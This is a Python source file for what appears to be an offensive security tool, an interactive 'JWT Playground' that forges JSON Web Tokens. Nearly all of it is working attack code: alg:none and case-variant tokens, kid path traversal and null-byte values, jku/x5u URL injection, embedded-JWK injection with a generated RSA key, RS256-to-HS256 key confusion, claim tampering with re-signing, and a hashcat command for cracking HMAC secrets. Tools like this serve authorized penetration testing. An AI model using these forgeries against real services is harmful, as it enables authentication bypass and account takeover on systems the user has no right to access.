import base64, json, jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from Dependencies.displays import M, W, R, Y, G, C, handle_error


# =========================================================
# Algorithm families
# =========================================================
ALG_FAMILIES = {
    "HS256": "HMAC",
    "HS384": "HMAC",
    "HS512": "HMAC",

    "RS256": "RSA",
    "RS384": "RSA",
    "RS512": "RSA",

    "ES256": "ECDSA",
    "ES384": "ECDSA",
    "ES512": "ECDSA",

    "EDDSA": "EdDSA",

    "NONE": "NONE"
}


# =========================================================
# Base64 helpers
# =========================================================
def b64url_encode(data: dict) -> str:
    raw = json.dumps(
        data,
        separators=(",", ":")
    ).encode()

    return base64.urlsafe_b64encode(
        raw
    ).decode().rstrip("=")


def b64url_decode(data: str):
    padding = "=" * (-len(data) % 4)
    raw = base64.urlsafe_b64decode(
        data + padding
    )

    return json.loads(raw.decode())


# =========================================================
# JWT Builder
# =========================================================
def build_jwt(
    header: dict,
    payload: dict,
    mode: str = "keep_invalid",
    algorithm: str = None,
    key=None,
    original_signature: str = ""
):
    """
    mode:
        - keep_invalid
        - resign
        - none
        - null_byte
        - empty_secret
    """
    h = b64url_encode(header)
    p = b64url_encode(payload)

    # -----------------------------------------------------
    # alg:none
    # -----------------------------------------------------
    if mode == "none":
        return f"{h}.{p}."

    # -----------------------------------------------------
    # Keep invalid signature
    # -----------------------------------------------------
    if mode == "keep_invalid":
        return f"{h}.{p}.{original_signature}"

    # -----------------------------------------------------
    # Empty secret signing
    # -----------------------------------------------------
    if mode == "empty_secret":
        return jwt.encode(
            payload,
            b"",
            algorithm=algorithm,
            headers=header
        )

    # -----------------------------------------------------
    # NULL BYTE signing
    # -----------------------------------------------------
    if mode == "null_byte":
        return jwt.encode(
            payload,
            b"\x00",
            algorithm=algorithm,
            headers=header
        )

    # -----------------------------------------------------
    # Re-sign token
    # -----------------------------------------------------
    if mode == "resign":
        if not key:
            raise ValueError(
                "Missing signing key"
            )

        return jwt.encode(
            payload,
            key,
            algorithm=algorithm,
            headers=header
        )

    raise ValueError(
        f"Unknown signing mode: {mode}"
    )


# =========================================================
# Attack vectors
# =========================================================
ATTACK_VECTORS = [

    # -----------------------------------------------------
    # Payload mutation
    # -----------------------------------------------------
    {
        "name": "payload mutation (invalid signature)",
        "type": "payload_mutation_invalid",
        "families": [
            "HMAC",
            "RSA",
            "ECDSA",
            "EdDSA"
        ]
    },
    {
        "name": "payload mutation (re-sign)",
        "type": "payload_mutation_resign",
        "families": [
            "HMAC",
            "RSA",
            "ECDSA",
            "EdDSA"
        ]
    },

    # -----------------------------------------------------
    # alg:none
    # -----------------------------------------------------
    {
        "name": "alg:none",
        "type": "alg_none",
        "families": [
            "HMAC",
            "RSA",
            "ECDSA",
            "EdDSA"
        ]
    },

    # -----------------------------------------------------
    # alg case variants
    # -----------------------------------------------------
    {
        "name": "alg case variants",
        "type": "alg_fuzz",
        "values": [
            "none",
            "NONE",
            "None",
            "nOnE"
        ],
        "families": [
            "HMAC",
            "RSA",
            "ECDSA"
        ]
    },

    # -----------------------------------------------------
    # kid traversal
    # -----------------------------------------------------
    {
        "name": "kid traversal (/dev/null)",
        "type": "header",
        "signing": "null_byte",
        "mod": {
            "kid": "../../../../../../../dev/null" # This one signed with null signature
        },
        "families": [
            "HMAC"
        ]
    },
    {
        "name": "kid traversal (/Windows/win.ini)",
        "type": "header",
        "signing": "keep_invalid",
        "mod": {
            "kid": "../../../../../../../Windows/win.ini"
        },
        "families": [
            "HMAC",
            "RSA",
            "ECDSA"
        ]
    },
    {
        "name": "kid nullbyte",
        "type": "header",
        "signing": "keep_invalid",
        "mod": {
            "kid": "key.pem\x00"
        },
        "families": [
            "RSA",
            "ECDSA"
        ]
    },

    # -----------------------------------------------------
    # jku injection
    # -----------------------------------------------------
    {
        "name": "jku injection",
        "type": "header",
        "signing": "keep_invalid",
        "mod": {
            "jku": "__USER_INPUT__"
        },
        "families": [
            "RSA",
            "ECDSA"
        ]
    },
    {
        "name": "x5u injection",
        "type": "header",
        "signing": "keep_invalid",
        "mod": {
            "x5u": "__USER_INPUT__"
        },
        "families": [
            "RSA"
        ]
    },

    # -----------------------------------------------------
    # JWK injection
    # -----------------------------------------------------
    {
        "name": "jwk injection",
        "type": "jwk_injection",
        "families": [
            "RSA"
        ]
    },

    # -----------------------------------------------------
    # RS256 -> HS256 confusion
    # -----------------------------------------------------
    {
        "name": "RS256 -> HS256 confusion",
        "type": "alg_confusion",
        "families": [
            "RSA"
        ]
    },

    # -----------------------------------------------------
    # Hashcat
    # -----------------------------------------------------
    {
        "name": "offline crack (hashcat)",
        "type": "hashcat",
        "families": [
            "HMAC"
        ]
    }
]


# =========================================================
# Attack Result Object
# =========================================================
class AttackResult:
    def __init__(
        self,
        name,
        token,
        signature_status
    ):

        self.name = name
        self.token = token
        self.signature_status = signature_status

    def display(self):
        print(
            f"{G}[+] {self.name}{W}"
        )

        print(
            f"{Y}[signature] "
            f"{self.signature_status}{W}"
        )

        print(self.token)
        print()


# =========================================================
# JWT Playground
# =========================================================
class JWTPlayground:
    
    # =====================================================
    # Init
    # =====================================================
    def __init__(self, jwt_token: str):
        self.original = jwt_token
        self.token = jwt_token
        parts = jwt_token.split(".")
        if len(parts) != 3:
            raise ValueError(
                "Invalid JWT format"
            )

        self.header_b64 = parts[0]
        self.payload_b64 = parts[1]
        self.signature = parts[2]
        self.header_json = b64url_decode(
            self.header_b64
        )

        self.payload_json = b64url_decode(
            self.payload_b64
        )

        self.alg = self.header_json.get(
            "alg",
            ""
        ).upper()

        self.family = ALG_FAMILIES.get(
            self.alg,
            "UNKNOWN"
        )

    # =====================================================
    # Utilities
    # =====================================================
    def apply_header(self, mutation: dict):
        h = self.header_json.copy()
        h.update(mutation)
        return h

    def prompt_user(
        self,
        prompt: str,
        default=None
    ):

        if default:
            print(
                f"{prompt} "
                f"[{default}] "
                f"(n/no to skip)"
            )

        else:
            print(
                f"{prompt} "
                f"(n/no to skip)"
            )

        val = input(
            f"{C}> "
        ).strip()

        if val.lower() in [
            "n",
            "no",
            ""
        ]:
            return None
        return val

    # =====================================================
    # Payload mutation
    # =====================================================
    def mutate_payload(self):
        print(
            f"\n{C}[!] Payload claims{W}"
        )

        keys = list(
            self.payload_json.keys()
        )

        for i, k in enumerate(keys):
            print(
                f"[{i}] "
                f"{k} = "
                f"{self.payload_json[k]}"
            )

        idx = input(
            f"\n{G}> "
        ).strip()

        if not idx.isdigit():
            return None

        idx = int(idx)
        if idx >= len(keys):
            return None

        selected = keys[idx]
        value = self.prompt_user(
            f"{G}New value for '{selected}'"
        )

        if value is None:
            return None

        mutated = self.payload_json.copy()
        mutated[selected] = value
        return mutated

    # =====================================================
    # RSA helpers
    # =====================================================
    @staticmethod
    def int_to_b64url(n: int):
        data = n.to_bytes(
            (n.bit_length() + 7) // 8,
            "big"
        )

        return base64.urlsafe_b64encode(
            data
        ).decode().rstrip("=")

    @staticmethod
    def generate_rsa_jwk():
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )

        public_key = private_key.public_key()
        numbers = public_key.public_numbers()
        jwk = {
            "kty": "RSA",
            "e": JWTPlayground.int_to_b64url(
                numbers.e
            ),
            "n": JWTPlayground.int_to_b64url(
                numbers.n
            ),
            "use": "sig",
            "kid": "thiefhunter"
        }

        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return (
            jwk,
            private_pem,
            public_pem
        )

    # =====================================================
    # Hashcat helper
    # =====================================================
    @staticmethod
    def generate_hashcat_cmd(
        jwt_token: str,
        wordlist: str = "rockyou.txt"
    ):

        return (
            f"hashcat -m 16500 "
            f"'{jwt_token}' "
            f"{wordlist} --force"
        )

    # =====================================================
    # Resolve placeholders
    # =====================================================
    def resolve_mod(self, mod: dict):
        def resolve(v):
            if isinstance(v, dict):
                out = {}
                for k, val in v.items():
                    r = resolve(val)
                    if r is None:
                        return None

                    out[k] = r
                return out

            if v == "__USER_INPUT__":
                user = self.prompt_user(
                    f"{G}Enter value"
                )

                if user is None:
                    return None
                    
                return user
            return v
        return resolve(mod)

    # =====================================================
    # Select attacks
    # =====================================================
    def select_attacks(self, vectors):
        print()
        for i, v in enumerate(vectors):
            print(
                f"[{i}] {v['name']}"
            )

        print(
            f"\n{G}Select attacks "
            f"(comma separated or all)"
        )

        choice = input(
            f"{C}> "
        ).strip()

        if choice.lower() == "all":
            return vectors

        indexes = [
            int(x)
            for x in choice.split(",")
            if x.strip().isdigit()
        ]

        return [
            vectors[i]
            for i in indexes
            if i < len(vectors)
        ]

    # =====================================================
    # Main generator
    # =====================================================
    def generate(self):
        results = []
        print(
            f"\n{C}[!] JWT family: "
            f"{Y}{self.family}{W}"
        )
        
        vectors = [
            v for v in ATTACK_VECTORS
            if self.family in v["families"]
        ]

        selected = self.select_attacks(
            vectors
        )
        print()

        for attack in selected:
            atype = attack["type"]

            # -------------------------------------------------
            # HASHCAT
            # -------------------------------------------------
            if atype == "hashcat":
                cmd = self.generate_hashcat_cmd(
                    self.token
                )

                print(
                    f"{G}[+] Hashcat command{W}"
                )

                print(cmd)
                print()
                continue

            # -------------------------------------------------
            # PAYLOAD INVALID
            # -------------------------------------------------

            if atype == "payload_mutation_invalid":
                payload = self.mutate_payload()
                if not payload:
                    continue

                token = build_jwt(
                    self.header_json,
                    payload,
                    mode="keep_invalid",
                    original_signature=self.signature
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        "INVALID"
                    )
                )
                continue

            # -------------------------------------------------
            # PAYLOAD RE-SIGN
            # -------------------------------------------------
            if atype == "payload_mutation_resign":
                payload = self.mutate_payload()
                if not payload:
                    continue

                key = self.prompt_user(
                    f"{G}Signing secret/private key"
                )

                if not key:
                    continue

                token = build_jwt(
                    self.header_json,
                    payload,
                    mode="resign",
                    key=key,
                    algorithm=self.alg
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        "VALID"
                    )
                )
                continue

            # -------------------------------------------------
            # alg:none
            # -------------------------------------------------
            if atype == "alg_none":
                header = self.apply_header({
                    "alg": "none"
                })

                token = build_jwt(
                    header,
                    self.payload_json,
                    mode="none"
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        "UNSIGNED"
                    )
                )
                continue

            # -------------------------------------------------
            # alg fuzzing
            # -------------------------------------------------
            if atype == "alg_fuzz":
                for variant in attack["values"]:
                    header = self.apply_header({
                        "alg": variant
                    })

                    token = build_jwt(
                        header,
                        self.payload_json,
                        mode="keep_invalid",
                        original_signature=self.signature
                    )

                    results.append(
                        AttackResult(
                            f"{attack['name']} ({variant})",
                            token,
                            "INVALID"
                        )
                    )
                continue

            # -------------------------------------------------
            # JWK injection
            # -------------------------------------------------
            if atype == "jwk_injection":
                print(
                    f"{G}[+] Generating "
                    f"RSA keypair + embedded JWK{W}"
                )

                jwk, private_key, _ = (
                    self.generate_rsa_jwk()
                )

                header = self.apply_header({
                    "kid": jwk["kid"],
                    "jwk": jwk
                })

                token = build_jwt(
                    header,
                    self.payload_json,
                    mode="resign",
                    key=private_key,
                    algorithm=self.alg
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        "VALID"
                    )
                )
                continue

            # -------------------------------------------------
            # RS256 -> HS256 confusion
            # -------------------------------------------------
            if atype == "alg_confusion":

                public_key = self.prompt_user(
                    f"{G}RSA public key PEM"
                )

                if not public_key:
                    continue

                header = self.apply_header({
                    "alg": "HS256"
                })

                token = build_jwt(
                    header,
                    self.payload_json,
                    mode="resign",
                    key=public_key,
                    algorithm="HS256"
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        "VALID (confusion)"
                    )
                )

                continue

            # -------------------------------------------------
            # Generic header attacks
            # -------------------------------------------------
            if atype == "header":
                mod = self.resolve_mod(
                    attack["mod"]
                )

                if not mod:
                    continue

                header = self.apply_header(
                    mod
                )

                signing_mode = attack.get(
                    "signing",
                    "keep_invalid"
                )

                token = build_jwt(
                    header,
                    self.payload_json,
                    mode=signing_mode,
                    algorithm=self.alg,
                    original_signature=self.signature
                )

                results.append(
                    AttackResult(
                        attack["name"],
                        token,
                        signing_mode.upper()
                    )
                )
                continue
        return results